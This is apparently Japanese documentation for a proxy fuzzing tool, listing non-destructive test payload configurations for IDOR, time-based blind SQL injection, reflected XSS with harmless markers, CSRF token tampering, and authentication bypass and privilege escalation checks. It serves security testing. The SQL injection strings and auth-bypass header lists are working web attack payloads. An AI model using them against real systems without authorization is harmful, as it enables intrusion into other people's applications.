# 非破壊的攻撃ペイロードパターン集

脆弱性種別ごとの非破壊的かつ識別可能なペイロード。
テスト環境のデータを破壊せず、レスポンスから成功/失敗を判定できる。

## IDOR (Insecure Direct Object Reference)

### 戦略

他ユーザーの ID に差し替えてアクセスし、ステータスコードとレスポンスの差異で判定する。

### ペイロード位置

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "body_json",
      "json_path": "$.user_id",
      "payload_set": "user-ids"
    }
  ],
  "payload_sets": {
    "user-ids": {
      "type": "range",
      "start": 1,
      "end": 20
    }
  }
}
```

PATH パラメータの場合:

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "path",
      "match": "/users/(\\d+)",
      "payload_set": "user-ids"
    }
  ],
  "payload_sets": {
    "user-ids": {"type": "range", "start": 1, "end": 20}
  }
}
```

### 判定方法

- 自分以外の ID で 200 + データ取得 -> IDOR 脆弱性あり
- 403/404 -> 適切にアクセス制御されている
- fuzz_results を `status_code` でソートし、200 のペイロードを確認する

## SQL Injection (Time-based Blind)

### 戦略

SLEEP ベースのペイロードで duration_ms の差異を観測する。

### ペイロード

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "body_json",
      "json_path": "$.search",
      "payload_set": "sqli"
    }
  ],
  "payload_sets": {
    "sqli": {
      "type": "wordlist",
      "values": [
        "normalvalue",
        "' OR SLEEP(3)-- ",
        "' OR SLEEP(3)#",
        "1 OR SLEEP(3)",
        "1; WAITFOR DELAY '0:0:3'--",
        "1' AND (SELECT SLEEP(3))-- ",
        "1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)"
      ]
    }
  }
}
```

### 判定方法

- `normalvalue` の duration_ms をベースラインとして記録
- SLEEP ペイロードで duration_ms が約 3000ms 増加 -> SQLi 脆弱性あり
- fuzz_results を `sort_by: "duration_ms"` で確認する
- `stop_on` で自動停止を設定する場合:

```json
{
  "stop_on": {
    "latency_threshold_ms": 5000,
    "latency_baseline_multiplier": 3.0,
    "latency_window": 5
  }
}
```

## XSS (Reflected Cross-Site Scripting)

### 戦略

無害なマーカー付きペイロードを送信し、レスポンスボディでエスケープの有無を確認する。

### ペイロード

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "query",
      "name": "q",
      "payload_set": "xss"
    }
  ],
  "payload_sets": {
    "xss": {
      "type": "wordlist",
      "values": [
        "KTP_NORMAL_TEXT",
        "<KTP_TAG>test</KTP_TAG>",
        "<img src=x onerror=KTP_XSS>",
        "'\"><KTP_TAG>",
        "javascript:KTP_XSS",
        "<svg/onload=KTP_XSS>",
        "{{KTP_TEMPLATE}}"
      ]
    }
  }
}
```

**注意**: `KTP_` プレフィックスは katashiro-proxy テスト用の識別マーカー。
実際のスクリプト実行は行わない。

### 判定方法

- fuzz_results で `body_contains: "<KTP_TAG>"` をフィルタ
- レスポンスに `<KTP_TAG>` がそのまま含まれる -> エスケープされていない (XSS 脆弱性あり)
- `&lt;KTP_TAG&gt;` に変換されている -> 適切にエスケープされている
- セッション詳細でレスポンスボディを確認し、コンテキストを分析する

## CSRF (Cross-Site Request Forgery)

### 戦略

CSRF トークンを削除/空値/他セッションの値に差し替えて、リクエストの成否を確認する。

### ペイロード

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "header",
      "name": "X-CSRF-Token",
      "payload_set": "csrf-tokens"
    }
  ],
  "payload_sets": {
    "csrf-tokens": {
      "type": "wordlist",
      "values": [
        "",
        "invalid-token-value",
        "00000000-0000-0000-0000-000000000000"
      ]
    }
  }
}
```

ヘッダ自体を削除するテスト:

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "header",
      "name": "X-CSRF-Token",
      "mode": "remove",
      "payload_set": "unused"
    }
  ]
}
```

### 判定方法

- 無効/空/削除トークンでリクエスト成功 (200/302) -> CSRF 保護なし
- 403/400 -> CSRF 保護が機能している
- Cookie ベースの CSRF トークンも同様にテスト (location: `cookie`)

## 認証・認可テスト

### 認証バイパス

Authorization ヘッダを操作する:

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "header",
      "name": "Authorization",
      "payload_set": "auth-bypass"
    }
  ],
  "payload_sets": {
    "auth-bypass": {
      "type": "wordlist",
      "values": [
        "",
        "Bearer ",
        "Bearer invalid",
        "Bearer null",
        "Basic YWRtaW46YWRtaW4="
      ]
    }
  }
}
```

### 認可 (権限昇格) テスト

低権限ユーザーのトークンで管理者 API にアクセスする:

```json
// execute (resend)
{
  "action": "resend",
  "params": {
    "session_id": "<admin-api-session-id>",
    "override_headers": {
      "Authorization": "Bearer <low-privilege-user-token>"
    },
    "tag": "authz-test-low-priv"
  }
}
```

### ロール降格テスト (fuzz)

複数のロールのトークンで同じ API をテストする:

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "header",
      "name": "Authorization",
      "match": "Bearer (.*)",
      "payload_set": "role-tokens"
    }
  ],
  "payload_sets": {
    "role-tokens": {
      "type": "wordlist",
      "values": [
        "<admin-token>",
        "<editor-token>",
        "<viewer-token>",
        "<guest-token>"
      ]
    }
  }
}
```

### 判定方法

- 低権限/無認証で管理者 API が 200 -> 認証/認可バイパス
- 401/403 -> 適切に保護されている
- fuzz_results を `status_code` でソートして 200 の結果を確認する

## ペイロード位置 (location) リファレンス

| location | 用途 | 必須パラメータ |
|----------|------|---------------|
| `header` | HTTP ヘッダ値の差し替え | `name` (ヘッダ名) |
| `query` | クエリパラメータの差し替え | `name` (パラメータ名) |
| `body_json` | JSON ボディの値差し替え | `json_path` (JSONPath) |
| `body_regex` | ボディの正規表現マッチ部分を差し替え | `match` (正規表現) |
| `path` | URL パスの一部を差し替え | `match` (正規表現) |
| `cookie` | Cookie 値の差し替え | `name` (Cookie 名) |

## mode オプション

| mode | 動作 |
|------|------|
| `replace` | 既存値をペイロードで置換 (デフォルト) |
| `add` | ペイロードを追加 |
| `remove` | パラメータ自体を削除 |
